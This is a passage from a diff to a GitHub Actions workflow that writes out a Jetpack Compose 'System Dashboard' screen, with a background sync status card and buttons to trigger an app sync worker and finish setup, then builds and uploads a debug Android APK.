+              Column(horizontalAlignment = Alignment.CenterHorizontally) {
+                  Text("System Dashboard", fontSize = 22.sp, fontWeight = FontWeight.Bold, color = Color.Black)
+                  Spacer(modifier = Modifier.height(16.dp))
+                  Card(
+                      modifier = Modifier.fillMaxWidth(),
+                      colors = CardDefaults.cardColors(containerColor = Color(0xFFE8F5E9))
+                  ) {
+                      Column(modifier = Modifier.padding(16.dp)) {
+                          Text("Sync Service Status", fontWeight = FontWeight.Bold, color = Color(0xFF2E7D32))
+                          Spacer(modifier = Modifier.height(4.dp))
+                          Text("Always On & Running in background", fontSize = 14.sp, color = Color.DarkGray)
+                      }
+                  }
+                  Spacer(modifier = Modifier.height(16.dp))
+                  Button(
+                      onClick = {
+                          WorkManager.getInstance(context).enqueue(OneTimeWorkRequestBuilder<AppsSyncWorker>().build())
+                      },
+                      modifier = Modifier.fillMaxWidth().height(48.dp),
+                      colors = ButtonDefaults.buttonColors(containerColor = Color.DarkGray)
+                  ) {
+                      Text("Trigger App Sync Now", color = Color.White)
+                  }
+                  Spacer(modifier = Modifier.weight(1f))
+                  Button(
+                      onClick = onFinish,
+                      modifier = Modifier.fillMaxWidth().height(56.dp),
+                      colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF34A853))
+                  ) {
+                      Text("Finish & Restart Setup", color = Color.White, fontSize = 16.sp)
+                  }
+              }
+          }
+          END_OF_FILE
+
+      - uses: actions/setup-java@v4
+        with:
+          distribution: temurin
+          java-version: 17
+      - uses: gradle/actions/setup-gradle@v4
+        with:
+          gradle-version: 8.7
+      - run: gradle assembleDebug
+      - uses: actions/upload-artifact@v4
+        with:
+          name: app-debug-apk
+          path: app/build/outputs/apk/debug/app-debug.apk
